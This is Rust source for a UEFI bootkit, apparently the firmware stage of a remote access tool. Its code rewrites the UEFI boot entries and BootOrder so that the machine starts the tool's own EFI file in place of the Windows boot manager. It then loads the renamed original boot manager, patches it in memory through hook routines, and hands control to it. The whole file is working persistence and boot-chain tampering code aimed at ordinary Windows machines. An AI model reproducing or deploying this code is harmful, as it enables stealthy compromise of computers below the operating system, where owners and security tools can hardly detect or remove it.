#![no_main]
#![no_std]

extern crate alloc;

mod error;
mod hooks;
mod patcher;
mod utils;

use alloc::string::{String, ToString};
use alloc::vec::Vec;
use alloc::{format, vec};
use core::slice;

use log::{LevelFilter, error, info};
use rat_common::windows::RAT_EFI_FILE_NAME;
use uefi::data_types::EqStrUntilNul;
use uefi::proto::device_path::build::DevicePathBuilder;
use uefi::proto::device_path::build::media::FilePath;
use uefi::proto::device_path::{DeviceSubType, DeviceType};
use uefi::proto::loaded_image::LoadedImage;
use uefi::runtime::VariableVendor;
use uefi::{CStr16, CString16, Status, boot, proto, runtime};
use uefi_raw::protocol::device_path::DevicePathProtocol;
use windows_sys::w;

use crate::error::{UefiErrorMessage, UefiResultConvertable};
use crate::hooks::bootmgfw;
use crate::utils::countdown;
use crate::utils::types::_EFI_LOAD_OPTION;

fn setup_new_boot_entry() {
    let target_utf8 = format!("\\EFI\\Microsoft\\Boot\\{RAT_EFI_FILE_NAME}");
    let mut target = target_utf8.encode_utf16().collect::<Vec<u16>>();
    target.push(0);

    let mut indices = vec![];
    let mut boot_order_var = None;
    let mut new_boot_entry = None;
    for key in runtime::variable_keys() {
        match key {
            Ok(key) => {
                let name = key.name.to_string();
                if name == "BootOrder" {
                    match runtime::get_variable_boxed(&key.name, &key.vendor) {
                        Ok((data, attributes)) => {
                            info!(
                                "Key {}, vendor {}, data = {data:02X?}",
                                key.name, key.vendor.0,
                            );
                            boot_order_var = Some((key, data, attributes));
                        }
                        Err(e) => {
                            error!("Cannot read {}: {e}", key.name);
                        }
                    }
                } else if let Some(index) = name.strip_prefix("Boot")
                    && let Ok(index) = u16::from_str_radix(index, 16)
                {
                    info!("Key {}, vendor {}", key.name, key.vendor.0);
                    indices.push(index);

                    match runtime::get_variable_boxed(&key.name, &key.vendor) {
                        Ok((mut data, attributes)) => {
                            if data.len() >= size_of::<_EFI_LOAD_OPTION>()
                                && let Some(header) =
                                    unsafe { data.as_ptr().cast::<_EFI_LOAD_OPTION>().as_ref() }
                            {
                                let mut ptr = data
                                    .as_mut_ptr()
                                    .wrapping_byte_add(size_of::<_EFI_LOAD_OPTION>())
                                    .cast::<u16>();
                                while let Some(&c) = unsafe { ptr.as_ref() }
                                    && c != 0
                                {
                                    ptr = ptr.wrapping_add(1);
                                }
                                ptr = ptr.wrapping_add(1);

                                let mut file_path_list = unsafe {
                                    slice::from_raw_parts_mut(
                                        ptr.cast::<u8>(),
                                        header.FilePathListLength.into(),
                                    )
                                };
                                while !file_path_list.is_empty() {
                                    match unsafe {
                                        file_path_list
                                            .as_ptr()
                                            .cast::<DevicePathProtocol>()
                                            .as_ref()
                                    } {
                                        Some(header) => {
                                            let length = usize::from(header.length());
                                            let (mut current, next) =
                                                file_path_list.split_at_mut(length);

                                            current =
                                                &mut current[size_of::<DevicePathProtocol>()..];
                                            file_path_list = next;

                                            if header.major_type == DeviceType::MEDIA
                                                && header.sub_type == DeviceSubType::HARDWARE_VENDOR
                                            {
                                                let current_u16 = unsafe {
                                                    slice::from_raw_parts_mut(
                                                        current.as_mut_ptr().cast::<u16>(),
                                                        current.len() / size_of::<u16>(),
                                                    )
                                                };
                                                if let Ok(path) =
                                                    CStr16::from_u16_with_nul(current_u16)
                                                {
                                                    info!("Boot entry path: {path}");
                                                    if path.eq_str_until_nul(
                                                        "\\EFI\\Microsoft\\Boot\\bootmgfw.efi",
                                                    ) {
                                                        current_u16[..].copy_from_slice(&target);
                                                        new_boot_entry = Some((attributes, data));
                                                        break;
                                                    } else if path.eq_str_until_nul(&target_utf8) {
                                                        new_boot_entry = None;
                                                        break;
                                                    }
                                                }
                                            }
                                        }
                                        None => {
                                            error!("This should never happen");
                                            break;
                                        }
                                    }
                                }
                            }
                        }
                        Err(e) => {
                            error!("Error reading variable value: {e}");
                        }
                    }
                }
            }
            Err(e) => {
                error!("Error reading variable key: {e}");
            }
        }
    }

    if let Some((bo_key, bo_data, bo_attributes)) = boot_order_var
        && let Some((attributes, data)) = new_boot_entry
    {
        indices.sort_unstable();
        indices.push(0); // If there is no free index, we simply create a new one with the next possible value.
        for (i, index) in indices.into_iter().enumerate() {
            if i != usize::from(index)
                && let Ok(index) = u16::try_from(i)
            {
                let name = format!("Boot{index:04X}");
                info!("Creating new boot entry {name:?}");
                match CString16::try_from(name.as_str()) {
                    Ok(name) => {
                        match runtime::set_variable(
                            &name,
                            &VariableVendor::GLOBAL_VARIABLE,
                            attributes,
                            &data,
                        ) {
                            Ok(_) => {
                                info!(
                                    "Created {name}, attributes = 0x{attributes:02X}, data = {data:02X?}"
                                )
                            }
                            Err(e) => error!("Error writing {name}: {e}"),
                        }

                        match runtime::get_variable_boxed(&name, &VariableVendor::GLOBAL_VARIABLE) {
                            Ok((data, _)) => {
                                info!("Read back {name} with {} bytes of data", data.len());
                            }
                            Err(e) => {
                                error!("Error reading back {name}: {e}");
                            }
                        }

                        let mut boot_order = vec![];
                        boot_order.extend_from_slice(&index.to_le_bytes());
                        boot_order.extend_from_slice(&bo_data);

                        match runtime::set_variable(
                            &bo_key.name,
                            &bo_key.vendor,
                            bo_attributes,
                            &boot_order,
                        ) {
                            Ok(_) => {
                                info!("Updated {}: {boot_order:02X?}", bo_key.name);
                            }
                            Err(e) => {
                                error!("Error writing {}: {e}", bo_key.name);
                            }
                        }
                    }
                    Err(e) => {
                        error!("Cannot construct CString16 from {name:?}: {e}");
                    }
                }
            }
        }
    }
}

fn entrypoint() -> uefi::Result<(), String> {
    // Log to COM2 port
    com_logger::builder()
        .base(0x2f8)
        .filter(LevelFilter::Trace)
        .setup();

    setup_new_boot_entry();

    info!("Loading bootmgfw_old.efi...");

    let our_handle = boot::image_handle();
    let our_image = boot::open_protocol_exclusive::<LoadedImage>(our_handle)
        .convert("Cannot open protocol of loaded image")?;
    let our_device_path = our_image
        .device()
        .ok_or_else(|| uefi::Error::new(Status::NOT_FOUND, "Cannot get device handle".to_string()))?
        .device_path()
        .convert("Cannot get device path protocol")?;

    let bootmgfw_path =
        unsafe { slice::from_raw_parts(w!("\\EFI\\Microsoft\\Boot\\bootmgfw_old.efi"), 1024) };
    let path_name = CStr16::from_u16_until_nul(bootmgfw_path).map_err(|_| {
        uefi::Error::new(
            Status::COMPROMISED_DATA,
            "Cannot construct UCS-2 string".to_string(),
        )
    })?;

    let mut buffer = vec![];
    let bootmgfw_device_path = our_device_path
        .append_path(
            DevicePathBuilder::with_vec(&mut buffer)
                .push(&FilePath { path_name })
                .map_err(|e| e.convert(format!("Cannot construct device path ({e})")))?
                .finalize()
                .map_err(|e| e.convert(format!("Cannot construct device path ({e})")))?,
        )
        .convert("Cannot append to device path")?;

    let bootmgfw_handle = boot::load_image(
        our_handle,
        boot::LoadImageSource::FromDevicePath {
            device_path: &bootmgfw_device_path,
            boot_policy: proto::BootPolicy::ExactMatch,
        },
    )
    .convert("Cannot load image")?;

    info!("Loaded bootmgfw_old.efi.");

    let bootmgfw_image = boot::open_protocol_exclusive::<LoadedImage>(bootmgfw_handle)
        .convert("Cannot open protocol of bootmgfw_old.efi")?;
    let (bootmgfw_buffer, bootmgfw_size) = bootmgfw_image.info();
    let bootmgfw_buffer =
        unsafe { slice::from_raw_parts_mut(bootmgfw_buffer as *mut u8, bootmgfw_size as usize) };
    bootmgfw::patch_bootmgfw(bootmgfw_buffer);

    info!("Starting bootmgfw_old.efi...");
    boot::start_image(bootmgfw_handle).convert("Cannot start image")
}

#[uefi::entry]
fn main() -> Status {
    match entrypoint() {
        Ok(()) => Status::SUCCESS,
        Err(e) => {
            error!("UEFI application error: {}", e.data());
            countdown(5);
            e.status()
        }
    }
}
